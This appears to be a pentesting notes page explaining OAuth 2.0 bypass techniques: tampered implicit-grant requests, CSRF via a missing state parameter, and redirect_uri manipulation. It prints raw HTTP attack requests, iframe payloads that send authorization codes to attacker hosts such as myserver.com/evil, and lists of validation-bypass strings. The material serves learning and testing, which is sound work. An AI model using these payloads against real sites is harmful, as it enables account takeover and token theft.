---
title: OAuth 2.0 Bypass
category: Web
order: 7
---

# Introduction

OAuth is a commonly used authorization framework that enables websites and web applications to request limited access to a user's account on another application. Crucially, OAuth allows the user to grant this access without exposing their login credentials to the requesting application.

# Vulnerabilities in the OAuth client application

Client applications will often use a reputable, battle-hardened OAuth service that is well protected against widely known exploits. However, their own side of the implementation may be less secure.

## Improper implementation of the implicit grant type

Once the OAuth 2.0 flow is completed and the token is assigned, the information is sent to the application (username, email and the token). We can bypass the authentication by changing the email and username of the request.

The client application will often submit this data to the server in a POST request and then assign the user a session cookie, effectively logging them in. This request is roughly equivalent to the form submission request that might be sent as part of a classic, password-based login. However, in this scenario, the server does not have any secrets or passwords to compare with the submitted data, which means that it is implicitly trusted. 

```
# Original Request

POST /authenticate HTTP/1.1
Host: oauth-test.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https:/oauth-test.com/oauth-callback
Content-Type: application/json
Origin: https://app-test.com
Content-Length: 103
Connection: close
Cookie: session=Pjx1J1HBlOKuYpE6ngdvP0lwKrc6N6xn


{
    "email":"user@test.com",
    "username":"user",
    "token":"0Uk8oyhR95JLrFnDdsgFBcHdcH1Tcz8GmLoZe6ECOAi"
}
```

```
# Edited Request

POST /authenticate HTTP/1.1
Host: oauth-test.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https:/oauth-test.com/oauth-callback
Content-Type: application/json
Origin: https://app-test.com
Content-Length: 103
Connection: close
Cookie: session=Pjx1J1HBlOKuYpE6ngdvP0lwKrc6N6xn


{
    "email":"another@test.com",
    "username":"another",
    "token":"0Uk8oyhR95JLrFnDdsgFBcHdcH1Tcz8GmLoZe6ECOAi"
}
```

## Flawed CSRF protection (no state parameter)

Although many components of the OAuth flows are optional, some of them are strongly recommended unless there's an important reason not to use them. One such example is the `state` parameter.

The `state` parameter should ideally contain an unguessable value, such as the hash of something tied to the user's session when it first initiates the OAuth flow. This value is then passed back and forth between the client application and the OAuth service as a form of [CSRF token](https://portswigger.net/web-security/csrf/tokens) for the client application.

Since this state parameter is not available in the request we can link our profile media to an existing account by exploiting a CSRF attack:

```
# CSRF vulnerable request

GET /oauth-linking?code=FIKlXwX7-cq6Xz0nsWmYUhqu1rwrRmKL9haVHOA7zVv HTTP/1.1
Host: app.test.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://exploit.test.com/exploit
Cookie: session=4UxlhSNG2r19csEDsUySJwHtVPSyE4eE
Upgrade-Insecure-Requests: 1

```

Payload:

```
# index.html

<iframe src="https://app.test.com/oauth-linking?code=FIKlXwX7-cq6Xz0nsWmYUhqu1rwrRmKL9haVHOA7zVv">
</iframe>
```

## Leaking authorization codes and access tokens

Depending on the grant type, either a code or token is sent via the victim's browser to the `/callback` endpoint specified in the `redirect_uri` parameter of the authorization request. If the OAuth service fails to validate this URI properly, an attacker may be able to construct a CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled `redirect_uri`.

In the case of the authorization code flow, an attacker can potentially steal the victim's code before it is used. They can then send this code to the client application's legitimate `/callback` endpoint (the original `redirect_uri`) to get access to the user's account.

```
# CSRF Vulnerable Request
# Modify the redirect_uri to a coontrolled server

GET /auth?client_id=zg8andmpp2lfjqidng0tr&redirect_uri=https://myserver.com/evil&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: oauth-server.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _session=7rn_lI1PoVH0bMKi3_Cmq; _session.legacy=7rn_lI1PoVH0bMKi3_Cmq
Upgrade-Insecure-Requests: 1
```

Payload:

```
#index.html

<iframe src="https://oauth-server.example.com/auth?client_id=zg8andmpp2lfjqidng0tr&redirect_uri=https://myserver.com/evil&response_type=code&scope=openid%20profile%20email">
</iframe>
```

##  Flawed redirect\_uri validation

`redirect_uri` parameter should be validated via white list, but sometimes is misconfigured and leads to flaws and vulnerabilities. Things to check:

* Try to remove or add arbitrary paths, query parameters, and fragments to see what you can change without triggering an error.
* Try to append extra values to the default `redirect_uri` parameter: `https://example.com &@foo.evil.com#@bar.evil.com/` .
* Try duplicate `redirect_uri` parameter.
* Begin with `localhost` : `http://localhost.evil.com/`.

## Stealing codes and access tokens via a proxy page

Against more robust targets, you might find that no matter what you try, you are unable to successfully submit an external domain as the `redirect_uri`.

Try to work out whether you can change the redirect_uri parameter to point to any other pages on a whitelisted domain. 

You can try to find a interesting subdirectory or use directory traversal tricks to supply any arbitrary path on the domain

```
https://client-app.com/oauth/callback/../../example/path
```

And if we have luck to find a open redirect, we can use it to steal the token.

```
https://oauth-server.example.com/auth?client_id=zg8andmpp2lfjqidng0tr&redirect_uri=/oauth/callback/../../open/redirect&response_type=code&scope=openid%20profile%20email
```

## OpenID unprotected dynamic client registration

The OpenID specification outlines a standardized way of allowing client applications to register with the OpenID provider. If dynamic client registration is supported, the client application can register itself by sending a `POST` request to a dedicated `/registration` endpoint. The name of this endpoint is usually provided in the configuration file and documentation. 

The register route it is specified on openid configuration file `/.well-known/openid-configuration`.

```
POST /openid/register HTTP/1.1
Content-Type: application/json
Accept: application/json
Host: oauth-authorization-server.com
Authorization: Bearer ab12cd34ef56gh89

{
    "application_type": "web",
    "redirect_uris": [
        "https://client-app.com/callback",
        "https://client-app.com/callback2"
        ],
    "client_name": "My Application",
    "logo_uri": "https://client-app.com/logo.png",
    "token_endpoint_auth_method": "client_secret_basic",
    "jwks_uri": "https://client-app.com/my_public_keys.jwks",
    "userinfo_encrypted_response_alg": "RSA1_5",
    "userinfo_encrypted_response_enc": "A128CBC-HS256",
    …
}
```

# References

* [https://portswigger.net/web-security/oauth](https://portswigger.net/web-security/oauth)
